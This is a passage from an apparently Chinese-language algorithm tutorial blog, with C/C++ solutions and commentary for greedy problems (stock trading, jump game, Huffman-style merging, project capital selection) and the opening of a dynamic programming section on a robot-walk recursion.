你可以尽可能多次买卖股票（多次买入和卖出）。但在再次买入之前，必须先卖出股票。</p><p>目标是设计一个算法来计算能够获得的最大利润。</p><p>示例</p><p><strong>示例 1</strong>：</p><ul><li><p><strong>输入</strong>：<code>prices = [7, 1, 5, 3, 6, 4]</code></p></li><li><p><strong>输出</strong>：<code>7</code></p></li><li><p>解释：</p><ul><li>第 2 天买入（价格 &#x3D; 1），第 3 天卖出（价格 &#x3D; 5），利润 &#x3D; 5 - 1 &#x3D; 4。</li><li>第 4 天买入（价格 &#x3D; 3），第 5 天卖出（价格 &#x3D; 6），利润 &#x3D; 6 - 3 &#x3D; 3。</li><li>总利润 &#x3D; 4 + 3 &#x3D; 7。</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//贪心策略是只要股票价格上涨，就进行一次卖出，把所有上涨的利润都累加起来，每次在价格上涨的前一天买入（隐藏）</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">maxProfit</span><span class="hljs-params">(<span class="hljs-type">int</span> prices[], <span class="hljs-type">int</span> n)</span> &#123;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; n; i++) &#123;<br>        ans += max(prices[i] - prices[i - <span class="hljs-number">1</span>], <span class="hljs-number">0</span>); <span class="hljs-comment">// 如果今天价格比前一天高，累加差价</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-built_in">cin</span> &gt;&gt; n; <span class="hljs-comment">// 输入股票的天数</span><br>    <span class="hljs-type">int</span> prices[n];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) <span class="hljs-built_in">cin</span> &gt;&gt; prices[i]; <span class="hljs-comment">// 输入每一天的股票价格</span><br>    <br>    <span class="hljs-built_in">cout</span> &lt;&lt; maxProfit(prices, n) &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-comment">// 输出最大利润</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="跳跃游戏"><a href="#跳跃游戏" class="headerlink" title="跳跃游戏"></a>跳跃游戏</h4><p>给定一个非负整数数组 <code>nums</code>，你最初位于数组的第一个位置。数组中的每个元素表示你在该位置可以跳跃的最大长度。目标是使用最少的跳跃次数到达数组的最后一个位置。</p><p>示例</p><p><strong>示例 1</strong>：</p><ul><li><strong>输入</strong>：<code>nums = [2,3,1,1,4]</code>   </li><li><strong>输出</strong>：<code>2</code></li><li><strong>解释</strong>：跳到最后一个位置的最小跳跃数是 2。可以先从索引 0 跳到索引 1，再从索引 1 跳到最后一个位置。</li></ul><p><strong>示例 2</strong>：</p><ul><li><strong>输入</strong>：<code>nums = [2,3,0,1,4]</code></li><li><strong>输出</strong>：<code>2</code></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//贪心策略，每一次只需要跳到再一次中最远的点</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin &gt;&gt; n; <span class="hljs-comment">// 输入数组的大小</span><br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">nums</span><span class="hljs-params">(n)</span></span>; <span class="hljs-comment">// 跳跃数组</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        cin &gt;&gt; nums[i]; <span class="hljs-comment">// 输入跳跃数组</span><br>    &#125;<br><br>    <span class="hljs-type">int</span> now = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 当前的位置</span><br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 跳跃次数</span><br><br>    <span class="hljs-keyword">while</span> (now &lt; n - <span class="hljs-number">1</span>) &#123; <span class="hljs-comment">// 当前还没到达终点</span><br>        <span class="hljs-type">int</span> right = now + nums[now]; <span class="hljs-comment">// 当前能跳到的最远范围</span><br>        <span class="hljs-keyword">if</span> (right &gt;= n - <span class="hljs-number">1</span>) &#123;<br>            cout &lt;&lt; ans + <span class="hljs-number">1</span> &lt;&lt; endl; <span class="hljs-comment">// 如果可以直接跳到最后，返回答案+1</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-type">int</span> nextRight = right;<br>        <span class="hljs-type">int</span> next = now;<br><br>        <span class="hljs-comment">// 遍历当前跳跃范围内的所有位置，找到能跳到的最远位置</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = now + <span class="hljs-number">1</span>; i &lt;= right; i++) &#123;<br>            <span class="hljs-keyword">if</span> (i + nums[i] &gt; nextRight) &#123; <span class="hljs-comment">// 更新最远跳跃位置</span><br>                nextRight = i + nums[i];<br>                next = i;<br>            &#125;<br>        &#125;<br><br>        now = next; <span class="hljs-comment">// 更新当前位置</span><br>        ans++; <span class="hljs-comment">// 增加跳跃次数</span><br>    &#125;<br><br>    cout &lt;&lt; ans &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><span class="hljs-comment">/*贪心策略：</span><br><span class="hljs-comment">在每一步跳跃中，选择当前可以跳到的范围内的最远位置，从而确保每次跳跃后可以达到更大的范围。</span><br><span class="hljs-comment">假设位置 a 可以跳到 b1、b2、b3，而这些位置 b1、b2、b3 各自的最远跳跃位置为 c1、c2、c3。此时应该从 a 跳到能够达到最远位置的那个 b，这样可以保证未来的跳跃范围最大。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">决策包容性：</span><br><span class="hljs-comment">选择从 a 跳到“能跳得更远”的 b，因为这个选择确保未来的可达集合包含了其他跳跃选择的可达位置。这种策略即使不考虑未来的所有可能情况，也能保证当前选择的合理性。</span><br><span class="hljs-comment">简单来说，这种局部最优的决策能够带来全局最优的结果。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">贪心策略</span><br><span class="hljs-comment">贪心策略：本题的贪心策略是在每一步中选择能够跳到最远的范围。通过这种逐步扩展跳跃范围的方式，每一步都接近终点，从而减少总的跳跃次数，实现最小步数。</span><br></code></pre></td></tr></table></figure><h4 id="哈弗曼编码下的问题"><a href="#哈弗曼编码下的问题" class="headerlink" title="哈弗曼编码下的问题"></a>哈弗曼编码下的问题</h4><p>通过每次选择最小的元素合并，确保得到最优的结果</p><p>1.冶金问题</p><p>{10, 20, 30} 我们需要这些长度的金块，总长度为数组之和，每次切割会消费这个和，怎么切割会让输出最小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">lessMoney</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr)</span> &#123;<br>    <span class="hljs-built_in">priority_queue</span>&lt;<span class="hljs-type">int</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;, greater&lt;<span class="hljs-type">int</span>&gt;&gt; pq(arr.begin(), arr.end()); <span class="hljs-comment">// 小根堆</span><br>    <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>, cur = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">while</span> (pq.size() &gt; <span class="hljs-number">1</span>) &#123;<br>        cur = pq.top(); pq.pop();   <span class="hljs-comment">//哈夫曼编码流程</span><br>        cur += pq.top(); pq.pop();<br>        sum += cur;<br>        pq.push(cur);<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> sum;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; arr = &#123;<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>&#125;;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; lessMoney(arr) &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-comment">// 输出 90</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>2.最小代价合并木棍问题</p><p>问题描述：<br>给定 <code>n</code> 根木棍，每次可以合并两根木棍，合并两根木棍的长度之和<strong>。最终我们要把所有木棍合并成一根，求</strong>最小的总合并代价</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAX_N = <span class="hljs-number">100</span>;  <span class="hljs-comment">// 假设木棍数量最大为100</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">minCostToMergeSticks</span><span class="hljs-params">(<span class="hljs-type">int</span> n, <span class="hljs-type">int</span> sticks[])</span> &#123;<br>    <span class="hljs-built_in">priority_queue</span>&lt;<span class="hljs-type">int</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;, greater&lt;<span class="hljs-type">int</span>&gt;&gt; pq;  <span class="hljs-comment">// 小根堆</span><br>    <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// 将所有木棍放入小根堆</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        pq.push(sticks[i]);<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (pq.size() &gt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-type">int</span> a = pq.top(); pq.pop();<br>        <span class="hljs-type">int</span> b = pq.top(); pq.pop();<br>        <span class="hljs-type">int</span> cost = a + b;<br>        sum += cost;<br>        pq.push(cost);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> sum;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-built_in">cin</span> &gt;&gt; n;  <span class="hljs-comment">// 读取木棍的数量</span><br>    <span class="hljs-type">int</span> sticks[MAX_N];  <span class="hljs-comment">// 静态数组存储木棍长度</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-built_in">cin</span> &gt;&gt; sticks[i];  <span class="hljs-comment">// 读取每根木棍的长度</span><br>    &#125;<br><br>    <span class="hljs-built_in">cout</span> &lt;&lt; minCostToMergeSticks(n, sticks) &lt;&lt; <span class="hljs-built_in">endl</span>;  <span class="hljs-comment">// 输出最小合并代价</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="项目安排问题"><a href="#项目安排问题" class="headerlink" title="项目安排问题"></a>项目安排问题</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*选择资本需求小的项目：首先要保证你有足够的资本来投资项目。因此，优先考虑当前资本（W）小于或等于项目资本需求的项目。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">选择利润最大的项目：在满足资本条件的项目中，选择能够带来最大利润的项目进行投资。这样可以确保每次投资带来最大的资本增长。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">重复进行：重复上述两步，直到完成最多 K 次投资。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">具体流程：</span><br><span class="hljs-comment">我们使用两个堆：</span><br><span class="hljs-comment">小根堆：按照资本大小排序，保证每次从最小的资本需求开始考虑项目。</span><br><span class="hljs-comment">大根堆：按照利润大小排序，确保每次从利润最大的项目中选择。</span><br><span class="hljs-comment">贪心选择理由：</span><br><span class="hljs-comment">为什么选择资本需求小的项目？</span><br><span class="hljs-comment">因为我们需要保证每次投资都能顺利进行。我们不能跳过当前资金无法投资的项目，所以我们需要一个优先队列来逐步筛选符合条件的项目。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">为什么选择利润大的项目？</span><br><span class="hljs-comment">为了最大化资本的增长。每次选择能够带来最大利润的项目，能够在接下来的投资中获得更多的资本，从而增加后续可选的项目范围。*/</span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAX_N = <span class="hljs-number">100</span>;  <span class="hljs-comment">// 假设最多有100个项目</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">findMaximizedCapital</span><span class="hljs-params">(<span class="hljs-type">int</span> K, <span class="hljs-type">int</span> W, <span class="hljs-type">int</span> Profits[], <span class="hljs-type">int</span> Capital[], <span class="hljs-type">int</span> N)</span> &#123;<br>    <span class="hljs-comment">// 创建一个小根堆（根据资本排序），minCostQ存储资本和对应的利润</span><br>    <span class="hljs-built_in">priority_queue</span>&lt;<span class="hljs-built_in">pair</span>&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">pair</span>&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt;, greater&lt;<span class="hljs-built_in">pair</span>&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt;&gt; minCostQ;<br>    <br>    <span class="hljs-comment">// 创建一个大根堆（根据利润排序），maxProfitQ存储利润和对应的资本</span><br>    <span class="hljs-built_in">priority_queue</span>&lt;<span class="hljs-built_in">pair</span>&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt; maxProfitQ;<br><br>    <span class="hljs-comment">// 将所有项目按照资本大小加入minCostQ</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i++) &#123;<br>        minCostQ.push(&#123;Capital[i], Profits[i]&#125;);<br>    &#125;<br><br>    <span class="hljs-comment">// 做K次投资，每次选择利润最大化</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; K; i++) &#123;<br>        <span class="hljs-comment">// 将所有资本不超过当前W的项目加入到maxProfitQ</span><br>        <span class="hljs-keyword">while</span> (!minCostQ.empty() &amp;&amp; minCostQ.top().first &lt;= W) &#123;<br>            maxProfitQ.push(minCostQ.top());<br>            minCostQ.pop(); <span class="hljs-comment">// 从minCostQ中移除已选择的项目</span><br>        &#125;<br><br>        <span class="hljs-comment">// 如果maxProfitQ为空，表示没有可以投资的项目，返回当前资本</span><br>        <span class="hljs-keyword">if</span> (maxProfitQ.empty()) &#123;<br>            <span class="hljs-keyword">return</span> W;<br>        &#125;<br><br>        <span class="hljs-comment">// 从maxProfitQ中取出利润最大的项目，更新当前资本W</span><br>        W += maxProfitQ.top().second;<br>        maxProfitQ.pop(); <span class="hljs-comment">// 移除已选择的项目</span><br>    &#125;<br><br>    <span class="hljs-keyword">return</span> W; <span class="hljs-comment">// 返回经过K次投资后的最大资本</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> Profits[MAX_N] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;;     <span class="hljs-comment">// 每个项目的利润</span><br>    <span class="hljs-type">int</span> Capital[MAX_N] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>&#125;;     <span class="hljs-comment">// 每个项目所需的资本</span><br>    <span class="hljs-type">int</span> K = <span class="hljs-number">2</span>;                          <span class="hljs-comment">// 最多可以进行2次投资</span><br>    <span class="hljs-type">int</span> W = <span class="hljs-number">0</span>;                          <span class="hljs-comment">// 初始资本为0</span><br>    <span class="hljs-type">int</span> N = <span class="hljs-number">3</span>;                          <span class="hljs-comment">// 项目数量</span><br><br>    <span class="hljs-comment">// 调用函数获取经过K次投资后的最大资本</span><br>    <span class="hljs-type">int</span> result = findMaximizedCapital(K, W, Profits, Capital, N);<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Maximized Capital: &quot;</span> &lt;&lt; result &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-comment">// 输出最大资本</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><hr><h2 id="十九-动态规划"><a href="#十九-动态规划" class="headerlink" title="十九.动态规划"></a>十九.动态规划</h2><h3 id="从暴力递归到动态规划"><a href="#从暴力递归到动态规划" class="headerlink" title="从暴力递归到动态规划"></a>从暴力递归到动态规划</h3><p>1，尝试运用模型解出暴力递归，原则是尽量少参，可变参数限制在int<br>    从左往右的尝试模型：要 or 不要<br>    范围尝试模型：0-index中的可能性<br>    样本对应模型：0-i 和 0-j 中判断逻辑，我们一般讨论i成为和不成为答案与j成为和不成为答案<br>    业务逻辑限制模型：</p><p>​暴力尝试模型要记得把边界条件定义出来，最后完成暴力模型一定要注意设置的参数不要有负数，要在进入子过程前用if过滤掉就不用写前面了，在子过程前写</p><p>2，写出递归尝试后使用dp<br>    发现重复调用了子过程用dp傻缓存，主函数设都是-1的表，过程加上这个dp,直接把暴力递归抄下来，第一行写 if (dp<code>[i][j]</code> !&#x3D; -1) {return dp<code>[i][j]</code>}最后一行dp<code>[i][j]</code>&#x3D;..<br>    画出表格发现某些各种用for来计算其他格子，找出位置依赖自己尝试填充格子</p><p>3，分析依赖关系自己优化填表<br>    某个格子依赖下面和左面，那就往上面和右面填表<br>    路径压缩：就是一个之前算完的格子可以替代现在要算的很多格子<br>    斜率优化：</p><h3 id="例题-10"><a href="#例题-10" class="headerlink" title="例题"></a>例题</h3><h4 id="宇宙机器人"><a href="#宇宙机器人" class="headerlink" title="宇宙机器人"></a>宇宙机器人</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//机器人可以每步向左和右走一格，那么走k步到aim的方法数是多少</span><br><span class="hljs-comment">//</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><span class="hljs-comment">//主过程先除掉不可能的值</span><br><span class="hljs-comment">// 机器人当前来到的位置是cur， 机器人还有rest步需要去走，最终的目标是aim， 有哪些位置？1~N 返回：机器人从cur出发，走过rest步之后，最终停在aim的方法数，是多少？</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">process1</span><span class="hljs-params">(<span class="hljs-type">int</span> cur, <span class="hljs-type">int</span> rest, <span class="hljs-type">int</span> aim, <span class="hljs-type">int</span> N)</span> &#123;<br>    <span class="hljs-keyword">if</span> (rest == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> cur == aim ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (cur == <span class="hljs-number">1</span>) &#123;   <span class="hljs-comment">//只能向右</span><br>        <span class="hljs-keyword">return</span> process1(<span class="hljs-number">2</span>, rest - <span class="hljs-number">1</span>, aim, N);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (cur == N) &#123;    <span class="hljs-comment">//只能向左</span><br>        <span class="hljs-keyword">return</span> process1(N - <span class="hljs-number">1</span>, rest - <span class="hljs-number">1</span>, aim, N);<br>    &#125;<br>    <span class="hljs-keyword">return</span> process1(cur - <span class="hljs-number">1</span>, rest - <span class="hljs-number">1</span>, aim, N) + process1(cur + <span class="hljs-number">1</span>, rest - <span class="hljs-number">1</span>, aim, N);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">ways1</span><span class="hljs-params">(<span class="hljs-type">int</span> N, <span class="hljs-type">int</span> start, <span class="hljs-type">int</span> aim, <span class="hljs-type">int</span> K)</span> &#123;<br>    <span class="hljs-keyword">if</span> (N &lt; <span class="hljs-number">2</span> || start &lt; <span class="hljs-number">1</span> || start &gt; N || aim &lt; <span class="hljs-number">1</span> || aim &gt; N || K &lt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> process1(start, K, aim, N);<br>&#125;<br><br><br><br><br><br><br><span class="hljs-comment">//傻缓存法，就是在上面的递归过程中把子过程的值抄到表里</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">process2</span><span class="hljs-params">(<span class="hljs-type">int</span> cur, <span class="hljs-type">int</span> rest, <span class="hljs-type">int</span> aim, <span class="hljs-type">int</span> N, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; dp)</span> &#123;<br>    <span class="hljs-keyword">if</span> (dp[cur][rest] != <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-keyword">return</span> dp[cur][rest];<br>    &#125;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (rest == <span class="hljs-number">0</span>) &#123;<br>        ans = cur == aim ? <span class="hljs-number">1</span> : <span 